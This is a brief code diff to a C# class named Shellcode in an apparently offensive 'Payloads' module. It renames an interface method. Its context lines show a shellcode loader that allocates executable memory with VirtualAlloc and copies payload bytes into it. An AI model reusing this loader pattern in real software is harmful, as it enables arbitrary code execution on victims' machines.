@@ -6,7 +6,7 @@ namespace Reader.Payloads
 {
     class Shellcode : IPayload
     {
-        void IPayload.Run(byte[] payload_data)
+        void IPayload.run(byte[] payload_data)
         {
             IntPtr ptr = VirtualAlloc((IntPtr)0, payload_data.Length, 0x3000, 0x40);
             Marshal.Copy(payload_data, 0, (IntPtr)ptr, payload_data.Length);
